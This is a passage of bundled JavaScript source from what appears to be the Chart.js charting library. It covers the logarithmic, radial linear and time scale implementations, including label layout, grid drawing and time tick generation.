    getPixelForTick: function (index) {
      var ticks = this.tickValues;
      if (index < 0 || index > ticks.length - 1) {
        return null;
      }
      return this.getPixelForValue(ticks[index]);
    },

    /**
     * Returns the value of the first tick.
     * @param {number} value - The minimum not zero value.
     * @return {number} The first tick value.
     * @private
     */
    _getFirstTickValue: function (value) {
      var exp = Math.floor(log10(value));
      var significand = Math.floor(value / Math.pow(10, exp));

      return significand * Math.pow(10, exp);
    },

    _configure: function () {
      var me = this;
      var start = me.min;
      var offset = 0;

      core_scale.prototype._configure.call(me);

      if (start === 0) {
        start = me._getFirstTickValue(me.minNotZero);
        offset =
          valueOrDefault$b(
            me.options.ticks.fontSize,
            core_defaults.global.defaultFontSize
          ) / me._length;
      }

      me._startValue = log10(start);
      me._valueOffset = offset;
      me._valueRange = (log10(me.max) - log10(start)) / (1 - offset);
    },

    getPixelForValue: function (value) {
      var me = this;
      var decimal = 0;

      value = +me.getRightValue(value);

      if (value > me.min && value > 0) {
        decimal =
          (log10(value) - me._startValue) / me._valueRange + me._valueOffset;
      }
      return me.getPixelForDecimal(decimal);
    },

    getValueForPixel: function (pixel) {
      var me = this;
      var decimal = me.getDecimalForPixel(pixel);
      return decimal === 0 && me.min === 0
        ? 0
        : Math.pow(
            10,
            me._startValue + (decimal - me._valueOffset) * me._valueRange
          );
    },
  });

  // INTERNAL: static default options, registered in src/index.js
  var _defaults$2 = defaultConfig$2;
  scale_logarithmic._defaults = _defaults$2;

  var valueOrDefault$c = helpers$1.valueOrDefault;
  var valueAtIndexOrDefault$1 = helpers$1.valueAtIndexOrDefault;
  var resolve$4 = helpers$1.options.resolve;

  var defaultConfig$3 = {
    display: true,

    // Boolean - Whether to animate scaling the chart from the centre
    animate: true,
    position: "chartArea",

    angleLines: {
      display: true,
      color: "rgba(0,0,0,0.1)",
      lineWidth: 1,
      borderDash: [],
      borderDashOffset: 0.0,
    },

    gridLines: {
      circular: false,
    },

    // label settings
    ticks: {
      // Boolean - Show a backdrop to the scale label
      showLabelBackdrop: true,

      // String - The colour of the label backdrop
      backdropColor: "rgba(255,255,255,0.75)",

      // Number - The backdrop padding above & below the label in pixels
      backdropPaddingY: 2,

      // Number - The backdrop padding to the side of the label in pixels
      backdropPaddingX: 2,

      callback: core_ticks.formatters.linear,
    },

    pointLabels: {
      // Boolean - if true, show point labels
      display: true,

      // Number - Point label font size in pixels
      fontSize: 10,

      // Function - Used to convert point labels
      callback: function (label) {
        return label;
      },
    },
  };

  function getTickBackdropHeight(opts) {
    var tickOpts = opts.ticks;

    if (tickOpts.display && opts.display) {
      return (
        valueOrDefault$c(
          tickOpts.fontSize,
          core_defaults.global.defaultFontSize
        ) +
        tickOpts.backdropPaddingY * 2
      );
    }
    return 0;
  }

  function measureLabelSize(ctx, lineHeight, label) {
    if (helpers$1.isArray(label)) {
      return {
        w: helpers$1.longestText(ctx, ctx.font, label),
        h: label.length * lineHeight,
      };
    }

    return {
      w: ctx.measureText(label).width,
      h: lineHeight,
    };
  }

  function determineLimits(angle, pos, size, min, max) {
    if (angle === min || angle === max) {
      return {
        start: pos - size / 2,
        end: pos + size / 2,
      };
    } else if (angle < min || angle > max) {
      return {
        start: pos - size,
        end: pos,
      };
    }

    return {
      start: pos,
      end: pos + size,
    };
  }

  /**
   * Helper function to fit a radial linear scale with point labels
   */
  function fitWithPointLabels(scale) {
    // Right, this is really confusing and there is a lot of maths going on here
    // The gist of the problem is here: https://gist.github.com/nnnick/696cc9c55f4b0beb8fe9
    //
    // Reaction: https://dl.dropboxusercontent.com/u/34601363/toomuchscience.gif
    //
    // Solution:
    //
    // We assume the radius of the polygon is half the size of the canvas at first
    // at each index we check if the text overlaps.
    //
    // Where it does, we store that angle and that index.
    //
    // After finding the largest index and angle we calculate how much we need to remove
    // from the shape radius to move the point inwards by that x.
    //
    // We average the left and right distances to get the maximum shape radius that can fit in the box
    // along with labels.
    //
    // Once we have that, we can find the centre point for the chart, by taking the x text protrusion
    // on each side, removing that from the size, halving it and adding the left x protrusion width.
    //
    // This will mean we have a shape fitted to the canvas, as large as it can be with the labels
    // and position it in the most space efficient manner
    //
    // https://dl.dropboxusercontent.com/u/34601363/yeahscience.gif

    var plFont = helpers$1.options._parseFont(scale.options.pointLabels);

    // Get maximum radius of the polygon. Either half the height (minus the text width) or half the width.
    // Use this to calculate the offset + change. - Make sure L/R protrusion is at least 0 to stop issues with centre points
    var furthestLimits = {
      l: 0,
      r: scale.width,
      t: 0,
      b: scale.height - scale.paddingTop,
    };
    var furthestAngles = {};
    var i, textSize, pointPosition;

    scale.ctx.font = plFont.string;
    scale._pointLabelSizes = [];

    var valueCount = scale.chart.data.labels.length;
    for (i = 0; i < valueCount; i++) {
      pointPosition = scale.getPointPosition(i, scale.drawingArea + 5);
      textSize = measureLabelSize(
        scale.ctx,
        plFont.lineHeight,
        scale.pointLabels[i]
      );
      scale._pointLabelSizes[i] = textSize;

      // Add quarter circle to make degree 0 mean top of circle
      var angleRadians = scale.getIndexAngle(i);
      var angle = helpers$1.toDegrees(angleRadians) % 360;
      var hLimits = determineLimits(angle, pointPosition.x, textSize.w, 0, 180);
      var vLimits = determineLimits(
        angle,
        pointPosition.y,
        textSize.h,
        90,
        270
      );

      if (hLimits.start < furthestLimits.l) {
        furthestLimits.l = hLimits.start;
        furthestAngles.l = angleRadians;
      }

      if (hLimits.end > furthestLimits.r) {
        furthestLimits.r = hLimits.end;
        furthestAngles.r = angleRadians;
      }

      if (vLimits.start < furthestLimits.t) {
        furthestLimits.t = vLimits.start;
        furthestAngles.t = angleRadians;
      }

      if (vLimits.end > furthestLimits.b) {
        furthestLimits.b = vLimits.end;
        furthestAngles.b = angleRadians;
      }
    }

    scale.setReductions(scale.drawingArea, furthestLimits, furthestAngles);
  }

  function getTextAlignForAngle(angle) {
    if (angle === 0 || angle === 180) {
      return "center";
    } else if (angle < 180) {
      return "left";
    }

    return "right";
  }

  function fillText(ctx, text, position, lineHeight) {
    var y = position.y + lineHeight / 2;
    var i, ilen;

    if (helpers$1.isArray(text)) {
      for (i = 0, ilen = text.length; i < ilen; ++i) {
        ctx.fillText(text[i], position.x, y);
        y += lineHeight;
      }
    } else {
      ctx.fillText(text, position.x, y);
    }
  }

  function adjustPointPositionForLabelHeight(angle, textSize, position) {
    if (angle === 90 || angle === 270) {
      position.y -= textSize.h / 2;
    } else if (angle > 270 || angle < 90) {
      position.y -= textSize.h;
    }
  }

  function drawPointLabels(scale) {
    var ctx = scale.ctx;
    var opts = scale.options;
    var pointLabelOpts = opts.pointLabels;
    var tickBackdropHeight = getTickBackdropHeight(opts);
    var outerDistance = scale.getDistanceFromCenterForValue(
      opts.ticks.reverse ? scale.min : scale.max
    );
    var plFont = helpers$1.options._parseFont(pointLabelOpts);

    ctx.save();

    ctx.font = plFont.string;
    ctx.textBaseline = "middle";

    for (var i = scale.chart.data.labels.length - 1; i >= 0; i--) {
      // Extra pixels out for some label spacing
      var extra = i === 0 ? tickBackdropHeight / 2 : 0;
      var pointLabelPosition = scale.getPointPosition(
        i,
        outerDistance + extra + 5
      );

      // Keep this in loop since we may support array properties here
      var pointLabelFontColor = valueAtIndexOrDefault$1(
        pointLabelOpts.fontColor,
        i,
        core_defaults.global.defaultFontColor
      );
      ctx.fillStyle = pointLabelFontColor;

      var angleRadians = scale.getIndexAngle(i);
      var angle = helpers$1.toDegrees(angleRadians);
      ctx.textAlign = getTextAlignForAngle(angle);
      adjustPointPositionForLabelHeight(
        angle,
        scale._pointLabelSizes[i],
        pointLabelPosition
      );
      fillText(
        ctx,
        scale.pointLabels[i],
        pointLabelPosition,
        plFont.lineHeight
      );
    }
    ctx.restore();
  }

  function drawRadiusLine(scale, gridLineOpts, radius, index) {
    var ctx = scale.ctx;
    var circular = gridLineOpts.circular;
    var valueCount = scale.chart.data.labels.length;
    var lineColor = valueAtIndexOrDefault$1(gridLineOpts.color, index - 1);
    var lineWidth = valueAtIndexOrDefault$1(gridLineOpts.lineWidth, index - 1);
    var pointPosition;

    if ((!circular && !valueCount) || !lineColor || !lineWidth) {
      return;
    }

    ctx.save();
    ctx.strokeStyle = lineColor;
    ctx.lineWidth = lineWidth;
    if (ctx.setLineDash) {
      ctx.setLineDash(gridLineOpts.borderDash || []);
      ctx.lineDashOffset = gridLineOpts.borderDashOffset || 0.0;
    }

    ctx.beginPath();
    if (circular) {
      // Draw circular arcs between the points
      ctx.arc(scale.xCenter, scale.yCenter, radius, 0, Math.PI * 2);
    } else {
      // Draw straight lines connecting each index
      pointPosition = scale.getPointPosition(0, radius);
      ctx.moveTo(pointPosition.x, pointPosition.y);

      for (var i = 1; i < valueCount; i++) {
        pointPosition = scale.getPointPosition(i, radius);
        ctx.lineTo(pointPosition.x, pointPosition.y);
      }
    }
    ctx.closePath();
    ctx.stroke();
    ctx.restore();
  }

  function numberOrZero(param) {
    return helpers$1.isNumber(param) ? param : 0;
  }

  var scale_radialLinear = scale_linearbase.extend({
    setDimensions: function () {
      var me = this;

      // Set the unconstrained dimension before label rotation
      me.width = me.maxWidth;
      me.height = me.maxHeight;
      me.paddingTop = getTickBackdropHeight(me.options) / 2;
      me.xCenter = Math.floor(me.width / 2);
      me.yCenter = Math.floor((me.height - me.paddingTop) / 2);
      me.drawingArea = Math.min(me.height - me.paddingTop, me.width) / 2;
    },

    determineDataLimits: function () {
      var me = this;
      var chart = me.chart;
      var min = Number.POSITIVE_INFINITY;
      var max = Number.NEGATIVE_INFINITY;

      helpers$1.each(chart.data.datasets, function (dataset, datasetIndex) {
        if (chart.isDatasetVisible(datasetIndex)) {
          var meta = chart.getDatasetMeta(datasetIndex);

          helpers$1.each(dataset.data, function (rawValue, index) {
            var value = +me.getRightValue(rawValue);
            if (isNaN(value) || meta.data[index].hidden) {
              return;
            }

            min = Math.min(value, min);
            max = Math.max(value, max);
          });
        }
      });

      me.min = min === Number.POSITIVE_INFINITY ? 0 : min;
      me.max = max === Number.NEGATIVE_INFINITY ? 0 : max;

      // Common base implementation to handle ticks.min, ticks.max, ticks.beginAtZero
      me.handleTickRangeOptions();
    },

    // Returns the maximum number of ticks based on the scale dimension
    _computeTickLimit: function () {
      return Math.ceil(this.drawingArea / getTickBackdropHeight(this.options));
    },

    convertTicksToLabels: function () {
      var me = this;

      scale_linearbase.prototype.convertTicksToLabels.call(me);

      // Point labels
      me.pointLabels = me.chart.data.labels.map(function () {
        var label = helpers$1.callback(
          me.options.pointLabels.callback,
          arguments,
          me
        );
        return label || label === 0 ? label : "";
      });
    },

    getLabelForIndex: function (index, datasetIndex) {
      return +this.getRightValue(
        this.chart.data.datasets[datasetIndex].data[index]
      );
    },

    fit: function () {
      var me = this;
      var opts = me.options;

      if (opts.display && opts.pointLabels.display) {
        fitWithPointLabels(me);
      } else {
        me.setCenterPoint(0, 0, 0, 0);
      }
    },

    /**
     * Set radius reductions and determine new radius and center point
     * @private
     */
    setReductions: function (
      largestPossibleRadius,
      furthestLimits,
      furthestAngles
    ) {
      var me = this;
      var radiusReductionLeft = furthestLimits.l / Math.sin(furthestAngles.l);
      var radiusReductionRight =
        Math.max(furthestLimits.r - me.width, 0) / Math.sin(furthestAngles.r);
      var radiusReductionTop = -furthestLimits.t / Math.cos(furthestAngles.t);
      var radiusReductionBottom =
        -Math.max(furthestLimits.b - (me.height - me.paddingTop), 0) /
        Math.cos(furthestAngles.b);

      radiusReductionLeft = numberOrZero(radiusReductionLeft);
      radiusReductionRight = numberOrZero(radiusReductionRight);
      radiusReductionTop = numberOrZero(radiusReductionTop);
      radiusReductionBottom = numberOrZero(radiusReductionBottom);

      me.drawingArea = Math.min(
        Math.floor(
          largestPossibleRadius -
            (radiusReductionLeft + radiusReductionRight) / 2
        ),
        Math.floor(
          largestPossibleRadius -
            (radiusReductionTop + radiusReductionBottom) / 2
        )
      );
      me.setCenterPoint(
        radiusReductionLeft,
        radiusReductionRight,
        radiusReductionTop,
        radiusReductionBottom
      );
    },

    setCenterPoint: function (
      leftMovement,
      rightMovement,
      topMovement,
      bottomMovement
    ) {
      var me = this;
      var maxRight = me.width - rightMovement - me.drawingArea;
      var maxLeft = leftMovement + me.drawingArea;
      var maxTop = topMovement + me.drawingArea;
      var maxBottom =
        me.height - me.paddingTop - bottomMovement - me.drawingArea;

      me.xCenter = Math.floor((maxLeft + maxRight) / 2 + me.left);
      me.yCenter = Math.floor(
        (maxTop + maxBottom) / 2 + me.top + me.paddingTop
      );
    },

    getIndexAngle: function (index) {
      var chart = this.chart;
      var angleMultiplier = 360 / chart.data.labels.length;
      var options = chart.options || {};
      var startAngle = options.startAngle || 0;

      // Start from the top instead of right, so remove a quarter of the circle
      var angle = (index * angleMultiplier + startAngle) % 360;

      return ((angle < 0 ? angle + 360 : angle) * Math.PI * 2) / 360;
    },

    getDistanceFromCenterForValue: function (value) {
      var me = this;

      if (helpers$1.isNullOrUndef(value)) {
        return NaN;
      }

      // Take into account half font size + the yPadding of the top value
      var scalingFactor = me.drawingArea / (me.max - me.min);
      if (me.options.ticks.reverse) {
        return (me.max - value) * scalingFactor;
      }
      return (value - me.min) * scalingFactor;
    },

    getPointPosition: function (index, distanceFromCenter) {
      var me = this;
      var thisAngle = me.getIndexAngle(index) - Math.PI / 2;
      return {
        x: Math.cos(thisAngle) * distanceFromCenter + me.xCenter,
        y: Math.sin(thisAngle) * distanceFromCenter + me.yCenter,
      };
    },

    getPointPositionForValue: function (index, value) {
      return this.getPointPosition(
        index,
        this.getDistanceFromCenterForValue(value)
      );
    },

    getBasePosition: function (index) {
      var me = this;
      var min = me.min;
      var max = me.max;

      return me.getPointPositionForValue(
        index || 0,
        me.beginAtZero
          ? 0
          : min < 0 && max < 0
          ? max
          : min > 0 && max > 0
          ? min
          : 0
      );
    },

    /**
     * @private
     */
    _drawGrid: function () {
      var me = this;
      var ctx = me.ctx;
      var opts = me.options;
      var gridLineOpts = opts.gridLines;
      var angleLineOpts = opts.angleLines;
      var lineWidth = valueOrDefault$c(
        angleLineOpts.lineWidth,
        gridLineOpts.lineWidth
      );
      var lineColor = valueOrDefault$c(angleLineOpts.color, gridLineOpts.color);
      var i, offset, position;

      if (opts.pointLabels.display) {
        drawPointLabels(me);
      }

      if (gridLineOpts.display) {
        helpers$1.each(me.ticks, function (label, index) {
          if (index !== 0) {
            offset = me.getDistanceFromCenterForValue(me.ticksAsNumbers[index]);
            drawRadiusLine(me, gridLineOpts, offset, index);
          }
        });
      }

      if (angleLineOpts.display && lineWidth && lineColor) {
        ctx.save();
        ctx.lineWidth = lineWidth;
        ctx.strokeStyle = lineColor;
        if (ctx.setLineDash) {
          ctx.setLineDash(
            resolve$4([angleLineOpts.borderDash, gridLineOpts.borderDash, []])
          );
          ctx.lineDashOffset = resolve$4([
            angleLineOpts.borderDashOffset,
            gridLineOpts.borderDashOffset,
            0.0,
          ]);
        }

        for (i = me.chart.data.labels.length - 1; i >= 0; i--) {
          offset = me.getDistanceFromCenterForValue(
            opts.ticks.reverse ? me.min : me.max
          );
          position = me.getPointPosition(i, offset);
          ctx.beginPath();
          ctx.moveTo(me.xCenter, me.yCenter);
          ctx.lineTo(position.x, position.y);
          ctx.stroke();
        }

        ctx.restore();
      }
    },

    /**
     * @private
     */
    _drawLabels: function () {
      var me = this;
      var ctx = me.ctx;
      var opts = me.options;
      var tickOpts = opts.ticks;

      if (!tickOpts.display) {
        return;
      }

      var startAngle = me.getIndexAngle(0);
      var tickFont = helpers$1.options._parseFont(tickOpts);
      var tickFontColor = valueOrDefault$c(
        tickOpts.fontColor,
        core_defaults.global.defaultFontColor
      );
      var offset, width;

      ctx.save();
      ctx.font = tickFont.string;
      ctx.translate(me.xCenter, me.yCenter);
      ctx.rotate(startAngle);
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";

      helpers$1.each(me.ticks, function (label, index) {
        if (index === 0 && !tickOpts.reverse) {
          return;
        }

        offset = me.getDistanceFromCenterForValue(me.ticksAsNumbers[index]);

        if (tickOpts.showLabelBackdrop) {
          width = ctx.measureText(label).width;
          ctx.fillStyle = tickOpts.backdropColor;

          ctx.fillRect(
            -width / 2 - tickOpts.backdropPaddingX,
            -offset - tickFont.size / 2 - tickOpts.backdropPaddingY,
            width + tickOpts.backdropPaddingX * 2,
            tickFont.size + tickOpts.backdropPaddingY * 2
          );
        }

        ctx.fillStyle = tickFontColor;
        ctx.fillText(label, 0, -offset);
      });

      ctx.restore();
    },

    /**
     * @private
     */
    _drawTitle: helpers$1.noop,
  });

  // INTERNAL: static default options, registered in src/index.js
  var _defaults$3 = defaultConfig$3;
  scale_radialLinear._defaults = _defaults$3;

  var deprecated$1 = helpers$1._deprecated;
  var resolve$5 = helpers$1.options.resolve;
  var valueOrDefault$d = helpers$1.valueOrDefault;

  // Integer constants are from the ES6 spec.
  var MIN_INTEGER = Number.MIN_SAFE_INTEGER || -9007199254740991;
  var MAX_INTEGER = Number.MAX_SAFE_INTEGER || 9007199254740991;

  var INTERVALS = {
    millisecond: {
      common: true,
      size: 1,
      steps: 1000,
    },
    second: {
      common: true,
      size: 1000,
      steps: 60,
    },
    minute: {
      common: true,
      size: 60000,
      steps: 60,
    },
    hour: {
      common: true,
      size: 3600000,
      steps: 24,
    },
    day: {
      common: true,
      size: 86400000,
      steps: 30,
    },
    week: {
      common: false,
      size: 604800000,
      steps: 4,
    },
    month: {
      common: true,
      size: 2.628e9,
      steps: 12,
    },
    quarter: {
      common: false,
      size: 7.884e9,
      steps: 4,
    },
    year: {
      common: true,
      size: 3.154e10,
    },
  };

  var UNITS = Object.keys(INTERVALS);

  function sorter(a, b) {
    return a - b;
  }

  function arrayUnique(items) {
    var hash = {};
    var out = [];
    var i, ilen, item;

    for (i = 0, ilen = items.length; i < ilen; ++i) {
      item = items[i];
      if (!hash[item]) {
        hash[item] = true;
        out.push(item);
      }
    }

    return out;
  }

  function getMin(options) {
    return helpers$1.valueOrDefault(options.time.min, options.ticks.min);
  }

  function getMax(options) {
    return helpers$1.valueOrDefault(options.time.max, options.ticks.max);
  }

  /**
   * Returns an array of {time, pos} objects used to interpolate a specific `time` or position
   * (`pos`) on the scale, by searching entries before and after the requested value. `pos` is
   * a decimal between 0 and 1: 0 being the start of the scale (left or top) and 1 the other
   * extremity (left + width or top + height). Note that it would be more optimized to directly
   * store pre-computed pixels, but the scale dimensions are not guaranteed at the time we need
   * to create the lookup table. The table ALWAYS contains at least two items: min and max.
   *
   * @param {number[]} timestamps - timestamps sorted from lowest to highest.
   * @param {string} distribution - If 'linear', timestamps will be spread linearly along the min
   * and max range, so basically, the table will contains only two items: {min, 0} and {max, 1}.
   * If 'series', timestamps will be positioned at the same distance from each other. In this
   * case, only timestamps that break the time linearity are registered, meaning that in the
   * best case, all timestamps are linear, the table contains only min and max.
   */
  function buildLookupTable(timestamps, min, max, distribution) {
    if (distribution === "linear" || !timestamps.length) {
      return [
        { time: min, pos: 0 },
        { time: max, pos: 1 },
      ];
    }

    var table = [];
    var items = [min];
    var i, ilen, prev, curr, next;

    for (i = 0, ilen = timestamps.length; i < ilen; ++i) {
      curr = timestamps[i];
      if (curr > min && curr < max) {
        items.push(curr);
      }
    }

    items.push(max);

    for (i = 0, ilen = items.length; i < ilen; ++i) {
      next = items[i + 1];
      prev = items[i - 1];
      curr = items[i];

      // only add points that breaks the scale linearity
      if (
        prev === undefined ||
        next === undefined ||
        Math.round((next + prev) / 2) !== curr
      ) {
        table.push({ time: curr, pos: i / (ilen - 1) });
      }
    }

    return table;
  }

  // @see adapted from https://www.anujgakhar.com/2014/03/01/binary-search-in-javascript/
  function lookup(table, key, value) {
    var lo = 0;
    var hi = table.length - 1;
    var mid, i0, i1;

    while (lo >= 0 && lo <= hi) {
      mid = (lo + hi) >> 1;
      i0 = table[mid - 1] || null;
      i1 = table[mid];

      if (!i0) {
        // given value is outside table (before first item)
        return { lo: null, hi: i1 };
      } else if (i1[key] < value) {
        lo = mid + 1;
      } else if (i0[key] > value) {
        hi = mid - 1;
      } else {
        return { lo: i0, hi: i1 };
      }
    }

    // given value is outside table (after last item)
    return { lo: i1, hi: null };
  }

  /**
   * Linearly interpolates the given source `value` using the table items `skey` values and
   * returns the associated `tkey` value. For example, interpolate(table, 'time', 42, 'pos')
   * returns the position for a timestamp equal to 42. If value is out of bounds, values at
   * index [0, 1] or [n - 1, n] are used for the interpolation.
   */
  function interpolate$1(table, skey, sval, tkey) {
    var range = lookup(table, skey, sval);

    // Note: the lookup table ALWAYS contains at least 2 items (min and max)
    var prev = !range.lo
      ? table[0]
      : !range.hi
      ? table[table.length - 2]
      : range.lo;
    var next = !range.lo
      ? table[1]
      : !range.hi
      ? table[table.length - 1]
      : range.hi;

    var span = next[skey] - prev[skey];
    var ratio = span ? (sval - prev[skey]) / span : 0;
    var offset = (next[tkey] - prev[tkey]) * ratio;

    return prev[tkey] + offset;
  }

  function toTimestamp(scale, input) {
    var adapter = scale._adapter;
    var options = scale.options.time;
    var parser = options.parser;
    var format = parser || options.format;
    var value = input;

    if (typeof parser === "function") {
      value = parser(value);
    }

    // Only parse if its not a timestamp already
    if (!helpers$1.isFinite(value)) {
      value =
        typeof format === "string"
          ? adapter.parse(value, format)
          : adapter.parse(value);
    }

    if (value !== null) {
      return +value;
    }

    // Labels are in an incompatible format and no `parser` has been provided.
    // The user might still use the deprecated `format` option for parsing.
    if (!parser && typeof format === "function") {
      value = format(input);

      // `format` could return something else than a timestamp, if so, parse it
      if (!helpers$1.isFinite(value)) {
        value = adapter.parse(value);
      }
    }

    return value;
  }

  function parse(scale, input) {
    if (helpers$1.isNullOrUndef(input)) {
      return null;
    }

    var options = scale.options.time;
    var value = toTimestamp(scale, scale.getRightValue(input));
    if (value === null) {
      return value;
    }

    if (options.round) {
      value = +scale._adapter.startOf(value, options.round);
    }

    return value;
  }

  /**
   * Figures out what unit results in an appropriate number of auto-generated ticks
   */
  function determineUnitForAutoTicks(minUnit, min, max, capacity) {
    var ilen = UNITS.length;
    var i, interval, factor;

    for (i = UNITS.indexOf(minUnit); i < ilen - 1; ++i) {
      interval = INTERVALS[UNITS[i]];
      factor = interval.steps ? interval.steps : MAX_INTEGER;

      if (
        interval.common &&
        Math.ceil((max - min) / (factor * interval.size)) <= capacity
      ) {
        return UNITS[i];
      }
    }

    return UNITS[ilen - 1];
  }

  /**
   * Figures out what unit to format a set of ticks with
   */
  function determineUnitForFormatting(scale, numTicks, minUnit, min, max) {
    var i, unit;

    for (i = UNITS.length - 1; i >= UNITS.indexOf(minUnit); i--) {
      unit = UNITS[i];
      if (
        INTERVALS[unit].common &&
        scale._adapter.diff(max, min, unit) >= numTicks - 1
      ) {
        return unit;
      }
    }

    return UNITS[minUnit ? UNITS.indexOf(minUnit) : 0];
  }

  function determineMajorUnit(unit) {
    for (var i = UNITS.indexOf(unit) + 1, ilen = UNITS.length; i < ilen; ++i) {
      if (INTERVALS[UNITS[i]].common) {
        return UNITS[i];
      }
    }
  }

  /**
   * Generates a maximum of `capacity` timestamps between min and max, rounded to the
   * `minor` unit using the given scale time `options`.
   * Important: this method can return ticks outside the min and max range, it's the
   * responsibility of the calling code to clamp values if needed.
   */
  function generate(scale, min, max, capacity) {
    var adapter = scale._adapter;
    var options = scale.options;
    var timeOpts = options.time;
    var minor =
      timeOpts.unit ||
      determineUnitForAutoTicks(timeOpts.minUnit, min, max, capacity);
    var stepSize = resolve$5([timeOpts.stepSize, timeOpts.unitStepSize, 1]);
    var weekday = minor === "week" ? timeOpts.isoWeekday : false;
    var first = min;
    var ticks = [];
    var time;

    // For 'week' unit, handle the first day of week option
    if (weekday) {
      first = +adapter.startOf(first, "isoWeek", weekday);
    }

    // Align first ticks on unit
    first = +adapter.startOf(first, weekday ? "day" : minor);

    // Prevent browser from freezing in case user options request millions of milliseconds
    if (adapter.diff(max, min, minor) > 100000 * stepSize) {
      throw (
        min +
        " and " +
        max +
        " are too far apart with stepSize of " +
        stepSize +
        " " +
        minor
      );
    }

    for (time = first; time < max; time = +adapter.add(time, stepSize, minor)) {
      ticks.push(time);
    }

    if (time === max || options.bounds === "ticks") {
      ticks.push(time);
    }

    return ticks;
  }

  /**
   * Returns the start and end offsets from edges in the form of {start, end}
   * where each value is a relative width to the scale and ranges between 0 and 1.
   * They add extra margins on the both sides by scaling down the original scale.
   * Offsets are added when the `offset` option is true.
   */
  function computeOffsets(table, ticks, min, max, options) {
    var start = 0;
    var end = 0;
    var first, last;

    if (options.offset && ticks.length) {
      first = interpolate$1(table, "time", ticks[0], "pos");
      if (ticks.length === 1) {
        start = 1 - first;
      } else {
        start = (interpolate$1(table, "time", ticks[1], "pos") - first) / 2;
      }
      last = interpolate$1(table, "time", ticks[ticks.length - 1], "pos");
      if (ticks.length === 1) {
        end = last;
      } else {
        end =
          (last -
            interpolate$1(table, "time", ticks[ticks.length - 2], "pos")) /
          2;
      }
    }

    return { start: start, end: end, factor: 1 / (start + 1 + end) };
  }

  function setMajorTicks(scale, ticks, map, majorUnit) {
    var adapter = scale._adapter;
    var first = +adapter.startOf(ticks[0].value, majorUnit);
    var last = ticks[ticks.length - 1].value;
    var major, index;

    for (
      major = first;
      major <= last;
      major = +adapter.add(major, 1, majorUnit)
    ) {
      index = map[major];
      if (index >= 0) {
        ticks[index].major = true;
      }
    }
    return ticks;
  }

  function ticksFromTimestamps(scale, values, majorUnit) {
    var ticks = [];
    var map = {};
    var ilen = values.length;
    var i, value;

    for (i = 0; i < ilen; ++i) {
      value = values[i];
      map[value] = i;

      ticks.push({
        value: value,
        major: false,
      });
    }

    // We set the major ticks separately from the above loop because calling startOf for every tick
    // is expensive when there is a large number of ticks
    return ilen === 0 || !majorUnit
      ? ticks
      : setMajorTicks(scale, ticks, map, majorUnit);
  }

  var defaultConfig$4 = {
    position: "bottom",

    /**
     * Data distribution along the scale:
     * - 'linear': data are spread according to their time (distances can vary),
     * - 'series': data are spread at the same distance from each other.
     * @see https://github.com/chartjs/Chart.js/pull/4507
     * @since 2.7.0
     */
    distribution: "linear",

    /**
     * Scale boundary strategy (bypassed by min/max time options)
     * - `data`: make sure data are fully visible, ticks outside are removed
     * - `ticks`: make sure ticks are fully visible, data outside are truncated
     * @see https://github.com/chartjs/Chart.js/pull/4556
     * @since 2.7.0
     */
    bounds: "data",

    adapters: {},
    time: {
      parser: false, // false == a pattern string from https://momentjs.com/docs/#/parsing/string-format/ or a custom callback that converts its argument to a moment
      unit: false, // false == automatic or override with week, month, year, etc.
      round: false, // none, or override with week, month, year, etc.
      displayFormat: false, // DEPRECATED
      isoWeekday: false, // override week start day - see https://momentjs.com/docs/#/get-set/iso-weekday/
      minUnit: "millisecond",
      displayFormats: {},
    },
    ticks: {
      autoSkip: false,

      /**
       * Ticks generation input values:
       * - 'auto': generates "optimal" ticks based on scale size and time options.
       * - 'data': generates ticks from data (including labels from data {t|x|y} objects).
       * - 'labels': generates ticks from user given `data.labels` values ONLY.
       * @see https://github.com/chartjs/Chart.js/pull/4507
       * @since 2.7.0
       */
      source: "auto",

      major: {
        enabled: false,
      },
    },
  };

  var scale_time = core_scale.extend({
    initialize: function () {
      this.mergeTicksOptions();
      core_scale.prototype.initialize.call(this);
    },

    update: function () {
      var me = this;
      var options = me.options;
      var time = options.time || (options.time = {});
      var adapter = (me._adapter = new core_adapters._date(
        options.adapters.date
      ));

      // DEPRECATIONS: output a message only one time per update
      deprecated$1("time scale", time.format, "time.format", "time.parser");
      deprecated$1("time scale", time.min, "time.min", "ticks.min");
      deprecated$1("time scale", time.max, "time.max", "ticks.max");

      // Backward compatibility: before introducing adapter, `displayFormats` was
      // supposed to contain *all* unit/string pairs but this can't be resolved
      // when loading the scale (adapters are loaded afterward), so let's populate
      // missing formats on update
      helpers$1.mergeIf(time.displayFormats, adapter.formats());

      return core_scale.prototype.update.apply(me, arguments);
    },

    /**
     * Allows data to be referenced via 't' attribute
     */
    getRightValue: function (rawValue) {
      if (rawValue && rawValue.t !== undefined) {
        rawValue = rawValue.t;
      }
      return core_scale.prototype.getRightValue.call(this, rawValue);
    },

    determineDataLimits: function () {
      var me = this;
      var chart = me.chart;
      var adapter = me._adapter;
      var options = me.options;
      var unit = options.time.unit || "day";
      var min = MAX_INTEGER;
      var max = MIN_INTEGER;
      var timestamps = [];
      var datasets = [];
      var labels = [];
      var i, j, ilen, jlen, data, timestamp, labelsAdded;
      var dataLabels = me._getLabels();

      for (i = 0, ilen = dataLabels.length; i < ilen; ++i) {
        labels.push(parse(me, dataLabels[i]));
      }

      for (i = 0, ilen = (chart.data.datasets || []).length; i < ilen; ++i) {
        if (chart.isDatasetVisible(i)) {
          data = chart.data.datasets[i].data;

          // Let's consider that all data have the same format.
          if (helpers$1.isObject(data[0])) {
            datasets[i] = [];

            for (j = 0, jlen = data.length; j < jlen; ++j) {
              timestamp = parse(me, data[j]);
              timestamps.push(timestamp);
              datasets[i][j] = timestamp;
            }
          } else {
            datasets[i] = labels.slice(0);
            if (!labelsAdded) {
              timestamps = timestamps.concat(labels);
              labelsAdded = true;
            }
          }
        } else {
          datasets[i] = [];
        }
      }

      if (labels.length) {
        min = Math.min(min, labels[0]);
        max = Math.max(max, labels[labels.length - 1]);
      }

      if (timestamps.length) {
        timestamps =
          ilen > 1
            ? arrayUnique(timestamps).sort(sorter)
            : timestamps.sort(sorter);
        min = Math.min(min, timestamps[0]);
        max = Math.max(max, timestamps[timestamps.length - 1]);
      }

      min = parse(me, getMin(options)) || min;
      max = parse(me, getMax(options)) || max;

      // In case there is no valid min/max, set limits based on unit time option
      min = min === MAX_INTEGER ? +adapter.startOf(Date.now(), unit) : min;
      max = max === MIN_INTEGER ? +adapter.endOf(Date.now(), unit) + 1 : max;

      // Make sure that max is strictly higher than min (required by the lookup table)
      me.min = Math.min(min, max);
      me.max = Math.max(min + 1, max);

